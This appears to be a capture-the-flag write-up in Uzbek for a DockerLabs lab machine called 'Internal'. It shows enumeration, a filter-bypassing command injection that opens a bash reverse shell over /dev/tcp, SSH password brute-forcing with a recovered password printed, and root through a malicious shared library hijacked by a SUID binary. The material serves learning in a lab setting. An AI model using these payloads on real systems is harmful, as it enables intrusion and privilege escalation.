# Internal-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 22 SSH, 80 http
Users: www-data, vault, root
Vulnerability: Command Injection (filter bypass), SUID binary (shared library hijacking)
```

## root flag:
> 📸 Screenshot (Notion sahifasida)

## user flag:
> 📸 Screenshot (Notion sahifasida)

---

# 1. Enumeration

Mashina nomi `Internal`. Ochiq portlarni aniqladim:

```bash
nmap -sV -sC -A -p- --min-rate 1000 172.17.0.2
```

- 22 SSH
- 80 HTTP

IP to'g'ridan ochilmadi, `/etc/hosts` ga domen nomi qo'shib oldim. Web sahifada ichki tarmoq backup boshqaruv paneli chiqdi.

Subdomain fuzzing qildim:

```bash
ffuf -u http://internal.dl -H "Host: FUZZ.internal.dl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

`backup` subdomain topildi, uni ham `/etc/hosts` ga qo'shdim.

---

# 2. Exploitation

`backup.internal.dl` sahifasida `Target Directory Path` input bor ekan. To'g'ridan komanda kiritsam `blocked` xatosi chiqdi. Filtrni aylanib o'tish uchun qo'shtirnoq ichiga olib sinab ko'rdim — muvofaqiyatli o'tdi.

---

# 3. Initial Access

Kali'da netcat listener ochib, Command Injection orqali reverse shell oldim:

```bash
/home $(bas''h -c "bas''h -i >& /dev/tcp/172.17.0.1/7777 0>&1")
```

`www-data` sheli keldi. `/opt` papkasida `.vault_pass.txt` faylini topdim. Hydra bilan `vault` userining parolini topdim:

```bash
hydra -u vault -P vaultPass.txt ssh://172.17.0.2
```

Paroli: `Yk8$pZ5@cN4!`

```bash
ssh vault@172.17.0.2
```

---

# 4. Privilege Escalation

SUID binary `/usr/local/bin/vaultctl` topildi. Strings orqali tekshirdim:

```bash
strings /usr/local/bin/vaultctl
```

`dlopen()` orqali `/opt/vaultlibs/libbackup.so` faylini yuklaydi va `run_backup` funksiyasini chaqiradi.

Zararli shared library yaratdim:

```c
#include <stdlib.h>
#include <unistd.h>

void run_backup() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o /tmp/libbackup.so /tmp/exploit.c
mv /opt/vaultlibs/libbackup.so /opt/vaultlibs/libbackup.so.bak
cp /tmp/libbackup.so /opt/vaultlibs/libbackup.so
/usr/local/bin/vaultctl
```

Root huquqi olindi!

---

**Mashina muvofaqiyatli yechildi!**
